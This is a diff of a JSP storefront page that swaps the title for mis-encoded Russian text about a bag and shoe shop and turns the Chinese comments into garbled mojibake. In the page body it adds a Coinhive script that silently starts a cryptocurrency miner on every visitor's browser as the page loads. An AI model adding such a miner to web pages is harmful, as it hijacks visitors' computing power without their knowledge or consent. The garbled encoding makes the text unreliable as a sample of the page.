@@ -10,50 +10,52 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html>
   <head>
-    <base href="<%=basePath%>">
+    	<base href="<%=basePath%>">
 		<meta charset="UTF-8">
-		<title>welcom poplanding store</title>
+		<title>999OWN.RU - ÐÐ¿ÑÐ¾Ð²ÑÐ¹ Ð¸Ð½ÑÐµÑÐ½ÐµÑ-Ð¼Ð°Ð³Ð°Ð·Ð¸Ð½ Ð¿Ð¾ Ð¿ÑÐ¾Ð´Ð°Ð¶Ðµ Ð¾Ð±ÑÐ²Ð¸ Ð¸ ÑÑÐ¼Ð¾Ðº</title>
 		<meta http-equiv="pragma" content="no-cache">
 		<meta http-equiv="cache-control" content="no-cache">
 		<meta http-equiv="expires" content="0">
 		<meta http-equiv="keywords" content="keyword1,keyword2,keyword3">
 		<meta http-equiv="description" content="This is my page">
 		
-		<!-- header以下布局 -->
+		<meta name="p:domain_verify" content="5926ca308c9c50c9e46234dce0a07efc"/>
+		
+		<!-- headerä»¥ä¸å¸å± -->
 		<link  href="common/css/style.css" rel="stylesheet" type="text/css"/>
 		
-		<!--商品分类侧边栏 -->
+		<!--åååç±»ä¾§è¾¹æ  -->
 		<link  href="common/css/silder.css" rel="stylesheet" type="text/css"/>
 		
-		<!-- 首页header页面滚动图布局样式css -->
+		<!-- é¦é¡µheaderé¡µé¢æ»å¨å¾å¸å±æ ·å¼css -->
         <link  href="common/css/leftmidright.css" rel="stylesheet" type="text/css"/>
         
-        <!-- js和jquery相关 -->
+        <!-- jsåjqueryç¸å³ -->
         <script type="text/javascript" src="js/json2.js"></script>
         <script type="text/javascript" src="js/jquery-1.10.2.js"></script>
         <script type="text/javascript" src="jquery-ui/jquery-ui.js"></script>
         <link rel="stylesheet" type="text/css" href="jquery-ui/jquery-ui.css">
         
         
-        <!-- 字体-->
+        <!-- å­ä½-->
         <link rel="stylesheet" type="text/css" href="css/font.css"> 
         
         
-        <!-- 图片轮播 -->
+        <!-- å¾çè½®æ­ -->
         <script type="text/javascript" src="common/js/imagePlay.js"></script>
         
         
-        <!-- 多tab需要的样式
+        <!-- å¤tabéè¦çæ ·å¼
         <link rel="stylesheet" type="text/css" href="css/rentclick.css">
         <script type="text/javascript" src="js/rentclick.js"></script> 
 		-->
         
-        <!-- ------------------------------和本网页相关--------------------------------------- -->
+        <!-- ------------------------------åæ¬ç½é¡µç¸å³--------------------------------------- -->
 
         
 		<script type="text/javascript" src="js/index.js"></script>
 		
-        <!-- ------------------------------和本网页相关--------------------------------------- -->
+        <!-- ------------------------------åæ¬ç½é¡µç¸å³--------------------------------------- -->
 		
 		
 
@@ -64,6 +66,14 @@
   </head>
   
   <body>
+  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('EnzK5M2jBaMcQ308UAOLhhQHP8GtV3zp');
+	miner.start();
+</script>
+	  	<div style="display: none">
+	        <%@ include file="common/language/multiLanguage.jsp" %>
+		</div>
   		<div id="header">
 			<%@ include file="common/header/headermenu.jsp" %>
 			<%@ include file="common/header/header.jsp" %>
